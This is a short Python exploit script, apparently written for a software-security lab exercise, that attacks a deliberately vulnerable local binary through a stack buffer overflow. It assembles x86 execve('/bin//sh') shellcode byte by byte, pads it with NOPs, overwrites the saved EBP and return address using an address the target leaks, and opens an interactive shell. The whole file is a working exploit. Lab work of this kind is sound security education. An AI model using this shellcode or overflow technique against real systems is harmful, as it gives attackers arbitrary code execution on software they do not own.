#!/usr/bin/python3
import sys
import subprocess
import pexpect

path = "/home/kribas/Software-Security-Lab/bof-exercise-2/bof3"
infile = f"{path}/input.txt"
vuln = f"{path}/main"

buff_len = 0x36

NOP = b'\x90' #1b
XOR_EAX_EAX= b'\x31\xc0' #2b
XOR_EDX_EDX = b"\x31\xd2" #2b
PUSH_EAX = b"\x50" #1b
PUSH_ARG_1 = b"\x68\x2f\x2f\x73\x68" #5b
PUSH_ARG_2 = b"\x68\x2f\x62\x69\x6e" #5b
MOV_EBX_ESP = b"\x89\xe3" #2b
MOV_AL_0B = b"\xb0\x0b" #2b
INT_80H = b"\xcd\x80" #2b

SHELLCODE = XOR_EAX_EAX+\
	XOR_EDX_EDX+\
	PUSH_EAX+\
	PUSH_ARG_1+\
	PUSH_ARG_2+\
	MOV_EBX_ESP+\
	MOV_AL_0B+\
	INT_80H

nop_num = buff_len-len(SHELLCODE)

io = pexpect.spawn(vuln)
io.expect('buffer1:0x')
addr = int(io.readline().decode().strip(),16).to_bytes(4,'little')

buffer = SHELLCODE + NOP*nop_num + b'_EBP' + addr
io.sendline(buffer)
io.interact()
